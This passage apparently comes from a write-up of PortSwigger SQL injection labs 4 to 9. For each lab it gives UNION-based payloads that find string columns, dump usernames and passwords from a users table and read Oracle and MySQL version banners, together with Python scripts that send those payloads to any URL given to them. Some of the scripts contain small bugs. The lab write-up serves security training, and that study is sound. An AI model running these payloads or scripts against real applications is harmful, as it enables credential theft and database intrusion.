</pre></table></code></div></div><p>For this case I am only testing 10 iterations, in case you are going to test too many iterations, it is recommended to create a session with the session library and attach the cookie as a parameter to make the requests more stable.</p><h2 id="lab-4---sql-injection-union-attack-finding-a-column-containing-text"><span class="mr-2">Lab 4 - SQL injection UNION attack, finding a column containing text</span><a href="#lab-4---sql-injection-union-attack-finding-a-column-containing-text" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we have to achieve the retrieve of the string ‘gIkMM7’ by the database, for this we need to know which column contains string format values, for that we make use of the tip learned in the theory section.</p><p><em>Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn</em></p><p>The payload to enter would be <code class="language-plaintext highlighter-rouge">'+UNION+SELECT+NULL,'gIkMM7',+NULL--</code>.</p><p>The query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span> <span class="s1">'gIkMM7'</span><span class="p">,</span> <span class="k">NULL</span><span class="c1">--</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli7.jpg" alt="" data-proofer-ignore></p><p>As we already knew, the table has 3 columns and we should only be testing in which of these columns the format is string, in this case the second column is string format, that’s why it returns what we requested</p><h3 id="lab-4-python-script"><span class="mr-2">Lab 4 Python Script</span><a href="#lab-4-python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>What this script does is to test the string given in each of the columns to know which of these accepts string format, when the response code is 200, it means that it has accepted the request, and has managed to inject sql code.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">"</span><span class="s">filter?category=Gifts</span><span class="sh">"</span>
    <span class="n">cols</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"'</span><span class="s">gIkMM7</span><span class="sh">'</span><span class="s">, NULL, NULL</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">NULL, </span><span class="sh">'</span><span class="s">gIkMM7</span><span class="sh">'</span><span class="s">, NULL</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">NULL, NULL, </span><span class="sh">'</span><span class="s">gIkMM7</span><span class="sh">'"</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cols</span><span class="p">:</span>
        <span class="n">q</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"'</span><span class="s"> UNION SELECT </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">-- </span><span class="sh">"</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The url for request is: {url}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">q</span><span class="p">))</span>
        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">q</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">q</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"'</span><span class="s">UNION+SELECT+NULL</span><span class="sh">"</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">columns</span><span class="o">=</span><span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">columns</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>In this case the table has only 3 columns and it could be done in an easy way, since there are only 3 cases to test as maximum, in the case that the table has many columns it would be better a session with the session library and not use lists, but a permutation code to be more efficient.</p><h2 id="lab-5---sql-injection-union-attack-retrieving-data-from-other-tables"><span class="mr-2">Lab 5 - SQL injection UNION attack, retrieving data from other tables</span><a href="#lab-5---sql-injection-union-attack-retrieving-data-from-other-tables" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we only need to retrieve the administrator password found in the users table, as the description says, we will use the following payload <code class="language-plaintext highlighter-rouge">'UNION SELECT username, password FROM users--</code> that will allow us to extract the user and password The query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span><span class="c1">--</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli8.jpg" alt="" data-proofer-ignore></p><h3 id="lab-5-python-script"><span class="mr-2">Lab 5 Python Script</span><a href="#lab-5-python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This lab is simple, because we only have to request the username and password from the users table and it has the same format as what is shown on the web, a title and the content, if we did not have the name of these columns we would have to find it out first.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">"</span><span class="s">category?=Gifts</span><span class="sh">"</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The url for request is: {url}--</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sh">"</span><span class="s">--</span><span class="sh">"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"'</span><span class="s">UNION SELECT username, password FROM Users</span><span class="sh">"</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">columns</span><span class="o">=</span><span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">columns</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="lab-6---sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"><span class="mr-2">Lab 6 - SQL injection UNION attack, retrieving multiple values in a single column</span><a href="#lab-6---sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we only have to concatenate two strings of different columns in a single column, since only one column of the table is in string format, for that we use the payload <code class="language-plaintext highlighter-rouge">'UNION SELECT NULL, username || '-' || password FROM users--</code>, remember that the syntax for concatenation may vary according to the database, I leave you this table for your guidance:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">DB Version<th style="text-align: left">Syntax for string concatenation<tbody><tr><td style="text-align: left">Oracle<td style="text-align: left">‘foo’||‘bar’<tr><td style="text-align: left">Microsoft<td style="text-align: left">‘foo’+’bar’<tr><td style="text-align: left">PostgreSQL<td style="text-align: left">‘foo’||‘bar’<tr><td style="text-align: left">MySQL<td style="text-align: left">‘foo’ ‘bar’ or CONCAT (‘foo’,’bar’)</table></div><p>The query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span> <span class="n">username</span> <span class="o">||</span><span class="s1">'-'</span><span class="o">||</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span><span class="c1">--</span>
</pre></table></code></div></div><p>this is what we get back from the web, the blessed credentials. <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli9.jpg" alt="" data-proofer-ignore></p><h3 id="lab-6---python-script"><span class="mr-2">Lab 6 - Python Script</span><a href="#lab-6---python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">"</span><span class="s">category?=Gifts</span><span class="sh">"</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The url for request is: {url}--</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sh">"</span><span class="s">--</span><span class="sh">"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"'</span><span class="s">UNION SELECT username ||</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="s">|| password FROM Users</span><span class="sh">"</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">columns</span><span class="o">=</span><span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">columns</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="lab-7---sql-injection-attack-querying-the-database-type-and-version-on-oracle"><span class="mr-2">Lab 7 - SQL injection attack, querying the database type and version on Oracle</span><a href="#lab-7---sql-injection-attack-querying-the-database-type-and-version-on-oracle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab, we have to find out the oracle database version, for this case first we must know how many columns the table has, in this case we can see 2 columns, since only the title and the description of the article are shown, then we use our <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">cheat-sheet</a> to make the corresponding query, so the payload in the URL will be: <code class="language-plaintext highlighter-rouge">'UNION SELECT 'VERSION', banner FROM v$version --</code>. And the query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="s1">'VERSION'</span><span class="p">,</span> <span class="n">banner</span> <span class="k">FROM</span> <span class="n">v</span><span class="err">$</span><span class="k">version</span> <span class="c1">--</span>
</pre></table></code></div></div><p>It will retrieve the database version</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli10.jpg" alt="" data-proofer-ignore></p><h3 id="lab-7---python-script"><span class="mr-2">Lab 7 - Python Script</span><a href="#lab-7---python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With this script we will query the web server and parse the information with the help of the bs4 library that contains BeautifulSoup to find the Oracle Database word, if it finds it we can say that the sql injection has been successful.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span> <span class="n">re</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">https://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">"</span><span class="s">category?=Lifestyle</span><span class="sh">"</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The url for request is: {url}--</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sh">"</span><span class="s">--</span><span class="sh">"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">Oracle Database</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Found database version</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">parsed</span><span class="o">=</span><span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">version</span><span class="o">=</span><span class="n">parsed</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sh">'</span><span class="s">*.Oracle\sDatabase.*</span><span class="sh">'</span><span class="p">))</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">The oracle database version is </span><span class="si">{</span><span class="n">version</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="n">version</span><span class="p">))</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"'</span><span class="s">UNION SELECT </span><span class="sh">'</span><span class="s">VERSION</span><span class="sh">'</span><span class="s">, banner FROM v$version</span><span class="sh">"</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">columns</span><span class="o">=</span><span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">columns</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="lab-8---sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft"><span class="mr-2">Lab 8 - SQL injection attack, querying the database type and version on MySQL and Microsoft</span><a href="#lab-8---sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we need to find out the MySQL database version, first we see how many columns the table has with the payload <code class="language-plaintext highlighter-rouge">'order by 2</code> by, after we find that it has 2 columns, we use the specific payload using the <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">cheat-sheet</a>, in this case it would be <code class="language-plaintext highlighter-rouge">@@version</code>, and instead of commenting with two dashes, we use #.</p><p>So the query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span> <span class="o">@@</span><span class="k">version</span><span class="o">%</span><span class="mi">23</span>
</pre></table></code></div></div><p>We use %23 because the hashtag has to be encoded, after that the response is the database version which is 8.0.28.</p><h3 id="lab-8---python-script"><span class="mr-2">Lab 8 - Python Script</span><a href="#lab-8---python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this case the script is the same as the previous one, only the payload changes, which in this case is <code class="language-plaintext highlighter-rouge">@@version</code>, you can be guided by the script of lab 7.</p><h2 id="lab-9---sql-injection-attack-listing-the-database-contents-on-non-oracle-databases"><span class="mr-2">Lab 9 - SQL injection attack, listing the database contents on non-Oracle databases</span><a href="#lab-9---sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab first we need the name of the tables, for that we use the parameter <code class="language-plaintext highlighter-rouge">table_name</code> and it will be extracted from <code class="language-plaintext highlighter-rouge">information_schema.tables</code> that allows us to read data about the database for more information read the <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html">Documentation</a>, as the query accepts 2 text parameters, we use NULL in one and we get all the tables in the database.</p><p>The payload in the URL look like this 